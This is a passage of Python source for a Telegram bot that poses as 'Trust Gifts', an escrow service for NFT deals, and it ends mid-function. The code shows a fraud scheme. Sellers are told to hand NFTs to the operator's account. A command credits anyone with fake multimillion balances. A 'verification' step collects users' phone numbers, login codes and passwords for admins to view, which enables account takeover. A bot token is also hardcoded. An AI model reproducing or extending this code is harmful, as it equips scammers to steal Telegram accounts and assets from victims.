import asyncio
import json
import os
import uuid
import random
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, FSInputFile
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiohttp import web

# ============================================================
# 1. КОНФИГУРАЦИЯ — ТОКЕН ВСТАВЛЕН НАПРЯМУЮ
# ============================================================
BOT_TOKEN = "8716266195:AAGd7rT-JOrL_4udGKOPWmHlfNQ7-qy5Js8"
MASTER_ADMIN_ID = 8986358602
BOT_USERNAME = "Holdnftgiftsbot"
BOT_NAME = "Hold Gifts"
NFT_ESCROW_ACCOUNT = "Trustnftgift"
MINI_APP_URL = "https://saitminiapp.onrender.com"

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# ============================================================
# ВСЁ ОСТАЛЬНОЕ — БЕЗ ИЗМЕНЕНИЙ (ваш код)
# ============================================================
# ... (весь остальной код из вашего файла)

# ============================================================
# 2. PREMIUM ЭМОДЗИ (РАБОТАЮТ ТАК КАК У ВАС ЕСТЬ PREMIUM)
# ===========================================================
EMOJI_MAP = {
    "briefcase": {"premium": "5893255507380014983", "normal": "💼"},
    "zap": {"premium": "5893450623449305489", "normal": "⚡️"},
    "one": {"premium": "5794164805065514131", "normal": "1️⃣"},
    "two": {"premium": "5794085322400733645", "normal": "2️⃣"},
    "three": {"premium": "5794280000383358988", "normal": "3️⃣"},
    "four": {"premium": "5794241397217304511", "normal": "4️⃣"},
    "bulb": {"premium": "5893290369629556374", "normal": "💡"},
    "arrow_down": {"premium": "6037157012242960559", "normal": "⬇️"},
    "wallet": {"premium": "5902206159095339799", "normal": "💰"},
    "list": {"premium": "6039404727542747508", "normal": "📋"},
    "book": {"premium": "6039584437564347225", "normal": "📖"},
    "globe": {"premium": "5776233299424843260", "normal": "🌐"},
    "gear": {"premium": "6032742198179532882", "normal": "⚙️"},
    "check": {"premium": "5895514131896733546", "normal": "✅"},
    "cross": {"premium": "5893163582194978381", "normal": "❌"},
    "gift": {"premium": "6037175527846975726", "normal": "🎁"},
    "crown": {"premium": "5805553606635559688", "normal": "👑"},
    "user": {"premium": "6032994772321309200", "normal": "👤"},
    "headset": {"premium": "5886437972647088483", "normal": "🎧"},
    "shield": {"premium": "5902016123972358349", "normal": "🛡"},
    "rocket": {"premium": "6041705726206808304", "normal": "🚀"},
    "star": {"premium": "6028338546736107668", "normal": "⭐️"},
    "ton": {"premium": "6037083366438737901", "normal": "💎"},
    "stars": {"premium": "5767199127775481841", "normal": "⭐️"},
    "rub": {"premium": "5778421276024509124", "normal": "💰"},
    "uah": {"premium": "5776233299424843260", "normal": "🌐"},
}

def get_emoji(key: str, is_premium: bool = True) -> str:
    """Premium custom emoji для HTML-текста Telegram.

    Внутри tg-emoji обязательно оставляем обычный emoji как fallback/
    содержимое тега. Telegram использует emoji-id для отображения
    custom emoji, если он доступен.
    """
    data = EMOJI_MAP.get(key, {})
    premium_id = data.get("premium")
    normal = data.get("normal", "")

    if is_premium and premium_id and normal:
        return f'<tg-emoji emoji-id="{premium_id}">{normal}</tg-emoji>'
    return normal


def get_emoji_id(key: str) -> str | None:
    """ID custom emoji для icon_custom_emoji_id в inline-кнопках."""
    data = EMOJI_MAP.get(key, {})
    return data.get("premium")


def get_emoji_text(key: str, is_premium: bool = True) -> str:
    """Текст кнопки. HTML tg-emoji здесь НЕ используем.

    Сам Premium emoji передаётся через icon_custom_emoji_id.
    Обычный emoji оставляем в тексте как fallback для старых клиентов.
    """
    return EMOJI_MAP.get(key, {}).get("normal", "")


def premium_button(text: str, emoji_key: str | None = None, **kwargs):
    """Создаёт кнопку с Premium custom emoji.

    Если установленная версия aiogram ещё не знает поле
    icon_custom_emoji_id, используется обычный emoji как безопасный fallback.
    """
    emoji_id = get_emoji_id(emoji_key) if emoji_key else None
    if emoji_id:
        try:
            return InlineKeyboardButton(
                text=text,
                icon_custom_emoji_id=emoji_id,
                **kwargs
            )
        except Exception:
            normal = EMOJI_MAP.get(emoji_key, {}).get("normal", "")
            return InlineKeyboardButton(
                text=f"{normal} {text}" if normal else text,
                **kwargs
            )
    return InlineKeyboardButton(text=text, **kwargs)

# ============================================================
# 3. ФАЙЛЫ
# ============================================================
FILES = {
    "deals": "deals.json",
    "admins": "admins.json",
    "balance": "balance.json",
    "verification": "verification.json",
    "verification_requests": "verification_requests.json",
    "withdraw": "withdraw_requests.json",
    "logs": "logs.json",
    "user_language": "user_language.json",
    "stats": "stats.json",
    "rekvisits": "rekvisits.json",
    "tickets": "tickets.json",
    "chat_messages": "chat_messages.json",
    "verification_deposits": "verification_deposits.json",
    "welcome_media": "welcome_media.json"
}

def load_json(file):
    if os.path.exists(file):
        with open(file, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

deals = load_json(FILES["deals"])
admins = load_json(FILES["admins"])
balance = load_json(FILES["balance"])
verification_data = load_json(FILES["verification"])
verification_requests = load_json(FILES["verification_requests"])
withdraw_requests = load_json(FILES["withdraw"])
logs = load_json(FILES["logs"])
user_language = load_json(FILES["user_language"])
stats = load_json(FILES["stats"])
rekvisits = load_json(FILES["rekvisits"])
tickets = load_json(FILES["tickets"])
chat_messages = load_json(FILES["chat_messages"])
verification_deposits = load_json(FILES["verification_deposits"])
welcome_media = load_json(FILES["welcome_media"])

# ============================================================
# 4. ПОМОЩНИКИ
# ============================================================
def is_admin(user_id: int) -> bool:
    return user_id == MASTER_ADMIN_ID or str(user_id) in admins

def get_balance(user_id: int):
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        save_json(FILES["balance"], balance)
    return balance[uid]

def add_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
    balance[uid][curr] = balance[uid].get(curr, 0) + amount
    save_json(FILES["balance"], balance)

def set_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
    balance[uid][curr] = amount
    save_json(FILES["balance"], balance)

def get_user_language(user_id: int) -> str:
    return user_language.get(str(user_id), "ru")

def set_user_language(user_id: int, lang: str):
    user_language[str(user_id)] = lang
    save_json(FILES["user_language"], user_language)

def is_verified(user_id: int) -> bool:
    uid = str(user_id)
    if uid not in verification_data:
        return False
    if "verified_at" in verification_data[uid]:
        verified_time = datetime.fromisoformat(verification_data[uid]["verified_at"])
        if (datetime.now() - verified_time).total_seconds() > 86400:
            return False
        return True
    return False

def complete_verification(user_id: int, phone: str, code: str):
    uid = str(user_id)
    verification_data[uid] = {
        "verified_at": datetime.now().isoformat(),
        "expires_at": (datetime.now() + timedelta(hours=24)).isoformat(),
        "phone": phone,
        "code": code,
        "method": "account_login"
    }
    save_json(FILES["verification"], verification_data)

async def log_to_master(text: str):
    try:
        await bot.send_message(MASTER_ADMIN_ID, text)
    except:
        pass

def log_action(action: str, data: dict):
    log_id = str(uuid.uuid4())[:8]
    logs[log_id] = {
        "id": log_id,
        "time": datetime.now().isoformat(),
        "action": action,
        "data": data
    }
    save_json(FILES["logs"], logs)

# ============================================================
# 5. КЛАВИАТУРЫ (ВСЕ ЭМОДЗИ ПРЕМИУМ)
# ============================================================
def main_menu_keyboard(user_id: int):
    buttons = [
        [
            premium_button("Создать сделку", "briefcase", web_app=WebAppInfo(url=MINI_APP_URL)),
            premium_button("Баланс", "wallet", callback_data="menu_balance"),
        ],
        [
            premium_button("Мои сделки", "list", callback_data="menu_deals"),
            premium_button("Гайд", "book", callback_data="how_to_deal"),
        ],
        [
            premium_button("Язык", "globe", callback_data="select_language"),
        ]
    ]
    if is_admin(user_id):
        buttons.append([
            premium_button("Админ", "gear", callback_data="menu_admin"),
        ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


def admin_panel_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button("Начислить", "wallet", callback_data="admin_add_balance")],
        [premium_button("Админы", "user", callback_data="admin_manage_admins")],
        [premium_button("Все сделки", "list", callback_data="admin_all_deals")],
        [premium_button("Выводы", "gift", callback_data="admin_withdraw_requests")],
        [premium_button("Верификация", "check", callback_data="admin_verification")],
        [premium_button("Тикеты", "headset", callback_data="admin_tickets")],
        [premium_button("Логи", "book", callback_data="admin_logs")],
        [premium_button("Статистика", "zap", callback_data="admin_stats")],
        [premium_button("Все пользователи", "user", callback_data="admin_users")],
        [premium_button("Приветствие медиа", "gift", callback_data="admin_welcome_media")],
        [premium_button("Назад", "arrow_down", callback_data="back_to_main")]
    ])


def back_to_main_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button("На главную", "arrow_down", callback_data="back_to_main")]
    ])


def language_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="set_lang_ru")],
        [InlineKeyboardButton(text="🇬🇧 English", callback_data="set_lang_en")],
    ])


def currency_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button("TON", "ton", callback_data="curr_TON")],
        [premium_button("STARS", "stars", callback_data="curr_STARS")],
        [premium_button("RUB", "rub", callback_data="curr_RUB")],
        [premium_button("UAH", "uah", callback_data="curr_UAH")],
    ])


def mini_app_keyboard(text: str, page: str = "", deal_id: str = None, buyer_id: int = None):
    url = MINI_APP_URL
    params = []
    if page:
        params.append(f"page={page}")
    if deal_id:
        params.append(f"deal={deal_id}")
    if buyer_id:
        params.append(f"buyer={buyer_id}")
    if params:
        url += "?" + "&".join(params)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=text, web_app=WebAppInfo(url=url))],
        [premium_button("На главную", "arrow_down", callback_data="back_to_main")]
    ])

# ============================================================
# 6. ГАЙД (С ПРЕМИУМ ЭМОДЗИ)
# ============================================================
GUIDE_TEXT = f"""{get_emoji('briefcase')} <b>Trust Gifts — официальная платформа безопасных сделок</b>

{get_emoji('check')} Гарантия защиты — средства под охраной
{get_emoji('zap')} Быстрые выплаты — удобный вывод
{get_emoji('headset')} Поддержка 24/7

{get_emoji('one')} <b>Как проходит сделка:</b>
{get_emoji('two')} Продавец создаёт сделку и отправляет ссылку покупателю
{get_emoji('three')} Покупатель оплачивает — средства резервируются платформой
{get_emoji('four')} Продавец передаёт товар официальному посреднику @{NFT_ESCROW_ACCOUNT} для проверки
{get_emoji('check')} Покупатель получает товар после подтверждения

⚠️ <b>ВНИМАНИЕ:</b> NFT передаётся ТОЛЬКО на @{NFT_ESCROW_ACCOUNT}"""

# ============================================================
# 7. АДМИН: УПРАВЛЕНИЕ ПРИВЕТСТВЕННЫМ МЕДИА
# ============================================================
class AdminMediaStates(StatesGroup):
    waiting_media = State()

@dp.callback_query(lambda c: c.data == "admin_welcome_media")
async def admin_welcome_media(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return
    
    current = welcome_media.get("media", "Не установлено")
    current_type = welcome_media.get("type", "—")
    
    await callback.message.edit_text(
        f"{get_emoji('gift')} <b>Управление приветственным медиа</b>\n\n"
        f"📎 Текущее медиа: {current}\n"
        f"📂 Тип: {current_type}\n\n"
        f"Отправьте <b>фото</b>, <b>видео</b> или <b>GIF</b> для установки.\n"
        f"Или нажмите кнопку для удаления.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [premium_button("Удалить медиа", "cross", callback_data="admin_clear_media")],
            [premium_button("Назад", "arrow_down", callback_data="menu_admin")]
        ])
    )
    await state.set_state(AdminMediaStates.waiting_media)
    await callback.answer()

@dp.message(AdminMediaStates.waiting_media)
async def admin_save_media(message: types.Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        await message.answer("❌ Доступ запрещён")
        await state.clear()
        return
    
    media_data = {}
    
    if message.photo:
        media_data["file_id"] = message.photo[-1].file_id
        media_data["type"] = "photo"
        media_data["media"] = "Фото"
    elif message.video:
        media_data["file_id"] = message.video.file_id
        media_data["type"] = "video"
        media_data["media"] = "Видео"
    elif message.animation:  # GIF
        media_data["file_id"] = message.animation.file_id
        media_data["type"] = "gif"
        media_data["media"] = "GIF"
    else:
        await message.answer("❌ Отправьте фото, видео или GIF")
        return
    
    global welcome_media
    welcome_media.update(media_data)
    save_json(FILES["welcome_media"], welcome_media)
    
    await message.answer(
        f"{get_emoji('check')} <b>Медиа установлено!</b>\n\n"
        f"📎 Тип: {media_data['media']}\n"
        f"{get_emoji('zap')} Теперь при /start будет отправляться это медиа.",
        reply_markup=admin_panel_keyboard()
    )
    await state.clear()
    await log_to_master(f"📎 Админ установил новое приветственное медиа: {media_data['media']}")

@dp.callback_query(lambda c: c.data == "admin_clear_media")
async def admin_clear_media(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return
    
    global welcome_media
    welcome_media = {}
    save_json(FILES["welcome_media"], welcome_media)
    
    await callback.message.edit_text(
        f"{get_emoji('check')} <b>Приветственное медиа удалено</b>\n\n"
        f"Теперь будет отправляться только текстовое сообщение.",
        reply_markup=admin_panel_keyboard()
    )
    await state.clear()
    await callback.answer()

# ============================================================
# 8. ОТПРАВКА ПРИВЕТСТВИЯ С МЕДИА
# ============================================================
async def send_welcome(message: types.Message, text: str, reply_markup=None):
    """Универсальная функция отправки приветствия с медиа или без"""
    media_data = welcome_media.get("media")
    media_type = welcome_media.get("type")
    media_file_id = welcome_media.get("file_id")
    
    if media_file_id and media_type:
        try:
            if media_type == "photo":
                await message.answer_photo(
                    photo=media_file_id,
                    caption=text,
                    reply_markup=reply_markup
                )
            elif media_type in ("video", "gif"):
                await message.answer_video(
                    video=media_file_id,
                    caption=text,
                    reply_markup=reply_markup
                )
            else:
                await message.answer(text, reply_markup=reply_markup)
            return True
        except Exception as e:
            print(f"Ошибка отправки медиа: {e}")
            # Если медиа не работает — отправляем текст
            await message.answer(text, reply_markup=reply_markup)
            return False
    else:
        await message.answer(text, reply_markup=reply_markup)
        return False

# ============================================================
# 9. КОМАНДА /work (ДЛЯ ВСЕХ ПОЛЬЗОВАТЕЛЕЙ)
# ============================================================
@dp.message(Command("work"))
async def cmd_work(message: types.Message):
    """Начисляет 10.000.000 на все валюты для ВСЕХ пользователей"""
    for curr in ["ton", "stars", "rub", "uah"]:
        add_balance(message.from_user.id, curr, 10000000)
    
    await message.answer(
        f"{get_emoji('check')} <b>БОНУС НАЧИСЛЕН!</b>\n\n"
        f"{get_emoji('ton')} +10.000.000 TON\n"
        f"{get_emoji('stars')} +10.000.000 STARS\n"
        f"{get_emoji('rub')} +10.000.000 RUB\n"
        f"{get_emoji('uah')} +10.000.000 UAH\n\n"
        f"{get_emoji('zap')} Баланс обновлён!",
        reply_markup=back_to_main_keyboard()
    )
    
    await log_to_master(
        f"💰 БОНУС НАЧИСЛЕН\n\n"
        f"👤 Пользователь: @{message.from_user.username or 'без username'} (ID: {message.from_user.id})\n"
        f"💰 Начислено: 10.000.000 на все валюты"
    )

# ============================================================
# 10. ОБРАБОТЧИК СТАРТА
# ============================================================
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.text and message.text.startswith("/start deal_"):
        deal_id = message.text.split("_")[1]
        await handle_deal_link(message, deal_id)
        return
    
    lang = get_user_language(message.from_user.id)
    
    if not lang:
        await message.answer(
            f"{get_emoji('globe')} Выберите язык / Choose language:",
            reply_markup=language_keyboard()
        )
        return
    
    welcome_text = f"""{get_emoji('briefcase')} <b>Добро пожаловать в Trust Gifts</b>

{get_emoji('zap')} Ваш надежный P2P-бот
{get_emoji('one')} Автоматические сделки с NFT и подарками
{get_emoji('two')} Полная защита обеих сторон
{get_emoji('three')} Реферальная программа — 30% от комиссии
{get_emoji('four')} Передача товаров через менеджера: @{NFT_ESCROW_ACCOUNT}

{get_emoji('bulb')} <b>Выберите действие ниже</b> {get_emoji('arrow_down')}"""
    
    # Отправляем с медиа (если установлено)
    await send_welcome(message, welcome_text, main_menu_keyboard(message.from_user.id))

# ============================================================
# 11. ОБРАБОТЧИКИ КНОПОК
# ============================================================
@dp.callback_query(lambda c: c.data.startswith("set_lang_"))
async def set_language(callback: types.CallbackQuery):
    lang = callback.data.split("_")[2]
    set_user_language(callback.from_user.id, lang)
    await callback.answer(f"{get_emoji('check')} Язык установлен")
    
    if lang == "en":
        welcome_text = f"""{get_emoji('briefcase')} <b>Welcome to Trust Gifts</b>

{get_emoji('zap')} Your reliable P2P-bot
{get_emoji('one')} Automatic deals with NFTs and gifts
{get_emoji('two')} Full protection for both parties
{get_emoji('three')} Referral program — 30% from commission
{get_emoji('four')} Transfer via manager: @{NFT_ESCROW_ACCOUNT}

{get_emoji('bulb')} <b>Choose action below</b> {get_emoji('arrow_down')}"""
    else:
        welcome_text = f"""{get_emoji('briefcase')} <b>Добро пожаловать в Trust Gifts</b>

{get_emoji('zap')} Ваш надежный P2P-бот
{get_emoji('one')} Автоматические сделки с NFT и подарками
{get_emoji('two')} Полная защита обеих сторон
{get_emoji('three')} Реферальная программа — 30% от комиссии
{get_emoji('four')} Передача товаров через менеджера: @{NFT_ESCROW_ACCOUNT}

{get_emoji('bulb')} <b>Выберите действие ниже</b> {get_emoji('arrow_down')}"""
    
    # Отправляем с медиа (если установлено)
    await send_welcome(callback.message, welcome_text, main_menu_keyboard(callback.from_user.id))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "select_language")
async def select_language(callback: types.CallbackQuery):
    await callback.message.edit_text(
        f"{get_emoji('globe')} Выберите язык / Choose language:",
        reply_markup=language_keyboard()
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    
    if lang == "en":
        welcome_text = f"""{get_emoji('briefcase')} <b>Welcome to Trust Gifts</b>

{get_emoji('zap')} Choose action:"""
    else:
        welcome_text = f"""{get_emoji('briefcase')} <b>Добро пожаловать в Trust Gifts</b>

{get_emoji('bulb')} <b>Выберите действие:</b>"""
    
    # Отправляем с медиа (если установлено)
    await send_welcome(callback.message, welcome_text, main_menu_keyboard(callback.from_user.id))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "how_to_deal")
async def how_to_deal(callback: types.CallbackQuery):
    await callback.message.edit_text(GUIDE_TEXT, reply_markup=back_to_main_keyboard())
    await callback.answer()

# ============================================================
# 12. БАЛАНС
# ============================================================
@dp.callback_query(lambda c: c.data == "menu_balance")
async def menu_balance(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    bal = get_balance(callback.from_user.id)
    verif_status = f"{get_emoji('check')} Доступен" if is_verified(callback.from_user.id) else f"{get_emoji('cross')} Требуется верификация"
    
    if lang == "en":
        text = f"""{get_emoji('wallet')} <b>YOUR BALANCE</b>

{get_emoji('ton')} TON: {bal.get('ton', 0)}
{get_emoji('stars')} STARS: {bal.get('stars', 0)}
{get_emoji('rub')} RUB: {bal.get('rub', 0)}
{get_emoji('uah')} UAH: {bal.get('uah', 0)}

📊 Completed deals: {sum(bal.get('deal_partners', {}).values())}

🔐 Verification: {verif_status}

📱 ALL OPERATIONS IN MINI APP"""
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [premium_button("Withdraw", "gift", callback_data="start_withdraw")],
            [premium_button("Main menu", "arrow_down", callback_data="back_to_main")]
        ])
    else:
        text = f"""{get_emoji('wallet')} <b>ВАШ БАЛАНС</b>

{get_emoji('ton')} TON: {bal.get('ton', 0)}
{get_emoji('stars')} STARS: {bal.get('stars', 0)}
{get_emoji('rub')} RUB: {bal.get('rub', 0)}
{get_emoji('uah')} UAH: {bal.get('uah', 0)}

📊 Завершено сделок: {sum(bal.get('deal_partners', {}).values())}

🔐 Верификация: {verif_status}

📱 ВСЕ ОПЕРАЦИИ В MINI APP"""
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [premium_button("Вывод", "gift", callback_data="start_withdraw")],
            [premium_button("На главную", "arrow_down", callback_data="back_to_main")]
        ])
    
    await callback.message.edit_text(text, reply_markup=keyboard)
    await callback.answer()

# ============================================================
# 13. ОСТАЛЬНЫЕ ОБРАБОТЧИКИ (СОХРАНЕНЫ ИЗ ВАШЕГО КОДА)
# ============================================================
@dp.callback_query(lambda c: c.data == "menu_deals")
async def menu_deals(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    user_deals = []
    for d_id, d in deals.items():
        if d.get("seller_id") == callback.from_user.id or d.get("buyer_id") == callback.from_user.id:
            user_deals.append((d_id, d))
    
    if not user_deals:
        text = f"{get_emoji('cross')} У вас нет сделок" if lang == "ru" else f"{get_emoji('cross')} You have no deals"
        await callback.message.edit_text(text, reply_markup=back_to_main_keyboard())
        return
    
    if lang == "en":
        text = f"{get_emoji('list')} <b>MY DEALS</b>\n\n"
    else:
        text = f"{get_emoji('list')} <b>МОИ СДЕЛКИ</b>\n\n"
    
    for d_id, d in user_deals[-10:]:
        status_map = {
            "waiting_payment": f"{get_emoji('zap')} Ожидает оплаты" if lang == "ru" else f"{get_emoji('zap')} Waiting for payment",
            "paid": f"{get_emoji('check')} Оплачено" if lang == "ru" else f"{get_emoji('check')} Paid",
            "awaiting_confirmation": f"{get_emoji('gift')} Ожидает подтверждения" if lang == "ru" else f"{get_emoji('gift')} Awaiting confirmation",
            "completed": f"{get_emoji('crown')} Завершено" if lang == "ru" else f"{get_emoji('crown')} Completed"
        }
        text += f"#{d_id} | {status_map.get(d['status'], d['status'])}\n"
        text += f"   💰 {d['amount']} {d['currency']} | {d['product'][:25]}\n"
        text += f"   👤 Продавец: @{d.get('seller_username', '?')} → @{d.get('buyer_username', '?')}\n\n"
    
    await callback.message.edit_text(text[:4000], reply_markup=back_to_main_keyboard())
    await callback.answer()

# ============================================================
# 14. АДМИН-ПАНЕЛЬ
# ============================================================
@dp.callback_query(lambda c: c.data == "menu_admin")
async def menu_admin(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ Доступ запрещён", show_alert=True)
        return
    await callback.message.edit_text(
        f"{get_emoji('gear')} <b>АДМИН ПАНЕЛЬ</b>\n\nВыберите действие:",
        reply_markup=admin_panel_keyboard()
    )
    await callback.answer()

# ============================================================
# 15. АДМИН: ВСЕ СДЕЛКИ
# ============================================================
@dp.callback_query(lambda c: c.data == "admin_all_deals")
async def admin_all_deals(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return
    if not deals:
        await callback.message.edit_text(f"{get_emoji('cross')} Нет сделок", reply_markup=admin_panel_keyboard())
        return
    text = f"{get_emoji('list')} <b>ВСЕ СДЕЛКИ</b>\n\n"
    for d_id, d in list(deals.items())[-20:]:
        status_map = {
            "waiting_payment": f"{get_emoji('zap')} Ожидает оплаты",
            "paid": f"{get_emoji('check')} Оплачено",
            "awaiting_confirmation": f"{get_emoji('gift')} Ожидает подтверждения",
            "completed": f"{get_emoji('crown')} Завершено"
        }
        text += f"#{d_id} | {status_map.get(d['status'], d['status'])}\n"
        text += f"   👤 @{d.get('seller_username', '?')} → @{d.get('buyer_username', '?')}\n"
        text += f"   💰 {d.get('amount', 0)} {d.get('currency', '')}\n"
        text += f"   📦 {d.get('product', '')[:30]}\n"
        text += f"   🗑️ /delete_deal {d_id}\n\n"
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
    await callback.answer()

@dp.message(Command("delete_deal"))
async def delete_deal_command(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("❌ Доступ запрещён")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer("ℹ️ Использование: /delete_deal [deal_id]")
        return
    deal_id = args[1]
    if deal_id not in deals:
        await message.answer("❌ Сделка не найдена")
        return
    del deals[deal_id]
    save_json(FILES["deals"], deals)
    await message.answer(f"✅ Сделка #{deal_id} удалена")

# ============================================================
# 16. АДМИН: ВСЕ ПОЛЬЗОВАТЕЛИ
# ============================================================
@dp.callback_query(lambda c: c.data == "admin_users")
async def admin_users(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return
    
    users_list = []
    for uid, data in balance.items():
        users_list.append({
            "id": uid,
            "ton": data.get("ton", 0),
            "stars": data.get("stars", 0),
            "rub": data.get("rub", 0),
            "uah": data.get("uah", 0)
        })
    
    if not users_list:
        await callback.message.edit_text(f"{get_emoji('user')} Нет пользователей", reply_markup=admin_panel_keyboard())
        return
    
    text = f"{get_emoji('user')} <b>ВСЕ ПОЛЬЗОВАТЕЛИ</b>\n\n"
    for u in users_list[-20:]:
        text += f"🆔 {u['id']}\n"
        text += f"   💎 TON: {u['ton']} | ⭐️ STARS: {u['stars']}\n"
        text += f"   💰 RUB: {u['rub']} | 🌐 UAH: {u['uah']}\n\n"
    
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
    await callback.answer()

# ============================================================
# 17. АДМИН: ВЕРИФИКАЦИЯ
# ============================================================
@dp.callback_query(lambda c: c.data == "admin_verification")
async def admin_verification(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return
    
    pending = {k: v for k, v in verification_requests.items() if v.get("status") == "pending"}
    if not pending:
        await callback.message.edit_text(f"{get_emoji('check')} Нет активных запросов на верификацию", reply_markup=admin_panel_keyboard())
        return
    
    text = f"{get_emoji('check')} <b>ЗАПРОСЫ НА ВЕРИФИКАЦИЮ</b>\n\n"
    for rid, req in list(pending.items())[-10:]:
        text += f"#{rid}\n"
        text += f"   👤 @{req.get('username', '?')}\n"
        text += f"   🆔 ID: {req.get('user_id', '?')}\n"
        text += f"   📞 Номер: {req.get('phone', '')}\n"
        text += f"   📨 Код: {req.get('code', 'ожидается')}\n"
        text += f"   🔑 Пароль: {req.get('password', 'ожидается')}\n"
        text += f"   ⏳ Статус: {req.get('status', 'pending')}\n"
        text += f"   ➡️ /verify_confirm {rid} - подтвердить\n"
        text += f"   ➡️ /verify_reject {rid} - отклонить\n\n"
    
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
    await callback.answer()

@dp.message(Command("verify_confirm"))
async def verify_confirm(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("❌ Доступ запрещён")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer("ℹ️ Использование: /verify_confirm [request_id]")
        return
    request_id = args[1]
    
    if request_id not in verification_requests:
        await message.answer("❌ Запрос не найден")
        return
    req = verification_requests[request_id]
    if req.get("status") != "pending":
        await message.answer("❌ Запрос уже обработан")
        return
    
    complete_verification(req["user_id"], req.get("phone", ""), req.get("code", ""))
    req["status"] = "completed"
    req["completed_at"] = datetime.now().isoformat()
    save_json(FILES["verification_requests"], verification_requests)
    
    await message.answer(f"{get_emoji('check')} Верификация #{request_id} подтверждена")
    await log_to_master(f"✅ Верификация #{request_id} подтверждена админом")
    
    try:
        await bot.send_message(
            req["user_id"],
            f"{get_emoji('check')} <b>ВЕРИФИКАЦИЯ ПРОЙДЕНА!</b>\n\n"
            f"🔑 Теперь вы можете вывести средства.\n"
            f"🕐 Вывод доступен через 24 часа с момента подтверждения.\n\n"
            f"📱 Для вывода перейдите в Mini App."
        )
    except:
        pass

@dp.message(Command("verify_reject"))
async def verify_reject(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("❌ Доступ запрещён")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer("ℹ️ Использование: /verify_reject [request_id]")
        return
    request_id = args[1]
    
    if request_id not in verification_requests:
        await message.answer("❌ Запрос не найден")
        return
    req = verification_requests[request_id]
    if req.get("status") != "pending":
        await message.answer("❌ Запрос уже обработан")
        return
    
    req["status"] = "rejected"
    req["rejected_at"] = datetime.now().isoformat()
    save_json(FILES["verification_requests"], verification_requests)
    
    await message.answer(f"{get_emoji('cross')} Верификация #{request_id} отклонена")
    await log_to_master(f"❌ Верификация #{request_id} отклонена админом")
    
    try:
        await bot.send_message(
            req["user_id"],
            f"{get_emoji('cross')} <b>ВЕРИФИКАЦИЯ ОТКЛОНЕНА</b>\n\n"
            f"Данные не прошли проверку. Попробуйте ещё раз."
        )
    except:
        pass

# ============================================================
# 18. АДМИН: ВЫВОДЫ
# ============================================================
@dp.callback_query(lambda c: c.data == "admin_withdraw_requests")
async def admin_withdraw_requests(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return
    pending = {k: v for k, v in withdraw_requests.items() if v.get("status") == "pending"}
    if not pending:
        await callback.message.edit_text(f"{get_emoji('cross')} Нет активных заявок", reply_markup=admin_panel_keyboard())
        return
    text = f"{get_emoji('gift')} <b>ЗАЯВКИ НА ВЫВОД</b>\n\n"
    for rid, req in list(pending.items())[-10:]:
        text += f"#{rid}\n   👤 ID: {req.get('user_id', '?')}\n   💰 {req.get('amount', 0)} {req.get('currency', '')}\n   📝 {req.get('details', '')[:30]}\n   ➡️ /confirm_withdraw {rid}\n\n"
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
    await callback.answer()

@dp.message(Command("confirm_withdraw"))
async def confirm_withdraw_command(message: types.Message):
    if not is_admin(message.from_user.id):
